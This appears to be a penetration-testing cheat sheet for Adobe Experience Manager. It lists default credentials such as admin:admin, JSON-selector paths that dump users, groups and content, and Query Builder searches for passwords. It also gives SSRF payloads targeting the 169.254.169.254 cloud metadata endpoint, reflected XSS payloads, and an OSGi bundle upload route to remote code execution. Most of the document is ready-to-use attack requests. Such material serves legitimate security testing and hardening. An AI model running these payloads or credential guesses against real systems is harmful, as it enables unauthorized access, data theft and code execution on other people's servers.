# Adobe Experience Manager (AEM) Security Testing

## Overview
Security testing for Adobe Experience Manager (AEM) CMS including default credentials, authentication bypass, and SSRF vulnerabilities.

## Reconnaissance
```
# AEM detection
curl -I https://target.com/libs/granite/core/content/login.html
curl -I https://target.com/system/console
curl -s https://target.com/content/dam/ → AEM DAM (Digital Asset Manager)

# Version detection
/system/console/bundles.json → OSGi bundles with versions
/etc/clientlibs/granite/clientlibs/foundation/user.min.js
```

## Default Credentials
```
# AEM Author
admin:admin (very common)
author:author
admin:password

# Felix OSGi Console
admin:admin
/system/console → Apache Felix Web Console
```

## Authentication Bypass & Path Tricks
```
# AEM path suffix bypass
# AEM ignores suffixes after selectors/extensions

/system/console.json → get JSON response for web console
/system/console.1.json → same with depth 1

# Anonymous access to restricted content
# Many AEM instances expose content to anonymous users

# .children.1.json → list child nodes
/content/dam.children.1.json
/content/dam.infinity.json

# tidy.json output
/content/users.tidy.1.json
/etc/replication.tidy.json
```

## Information Disclosure
```
# User enumeration
/home/users.1.json → list users
/home/users.infinity.json
/home/users/admin.json

# Group enumeration
/home/groups.1.json
/home/groups.infinity.json

# Content exposure
/content.infinity.json → all content
/etc.infinity.json
/var.infinity.json
/apps.infinity.json

# Configuration exposure
/system/console/configMgr → OSGi config manager (if accessible)
/system/console/jmx → JMX (Java Management Extensions)

# Query Builder endpoint
GET /bin/querybuilder.json?type=nt:file&path=/etc → list files
GET /bin/querybuilder.json?type=dam:Asset&path=/content/dam
GET /bin/querybuilder.json?fulltext=password&type=nt:unstructured
```

## SSRF via AEM
```
# SSRF via Content Grabber / Link Checker
POST /etc/linkchecker.json
url=http://169.254.169.254/latest/meta-data/

# SSRF via GETServlet
GET /bin/wcm/search/gethints.json?query=http://169.254.169.254/
GET /libs/cq/cloudserviceconfigs/content/jcr:content/par.html?test=http://169.254.169.254/

# SSRF via Twitter/OAuth integration
GET /libs/social/integrations/oauth/content/register.html?callbackURL=http://169.254.169.254/

# Image Servlet SSRF
GET /bin/wcm/clientrte/image;selector.type=json?src=http://169.254.169.254/
```

## XSS in AEM
```
# Reflected XSS via error pages
/content/dam/something<script>alert(1)</script>

# XSS via selector
/content/page.html/a.html"><script>alert(1)</script>

# XSS in search
/search.html?q=<script>alert(1)</script>

# XSS via JSON renderers
/content/page.children.2.json/><img onerror=alert(1)>
```

## AEM SCD (Sling Content Distribution) Abuse
```
# Distribution agents may allow SSRF
/libs/sling/distribution/
```

## Felix OSGi Console
```
# If accessible: /system/console
# Install malicious OSGi bundle → RCE

# Upload .jar bundle:
POST /system/console/bundles
# With malicious OSGi bundle → arbitrary code execution

# Shell command via console
/system/console/jmx/com.adobe.granite%3Atype%3DRepository/op/backup/java.lang.String
```

## Testing Methodology
1. Detect AEM via default paths
2. Test default credentials (admin:admin)
3. Check .infinity.json and .children.json on user/group paths
4. Test Query Builder for data extraction
5. Test SSRF via linkchecker and other built-in servlets
6. Check OSGi console accessibility
7. Test for XSS via selectors and search
8. Look for anonymous content access
9. Check for exposed configuration at /etc/ and /var/

## Tools
- `nuclei -t aem/` templates
- `aem-hacker` tool for AEM-specific testing
- Burp Suite for manual testing
- `AEM Security Checklist` resources
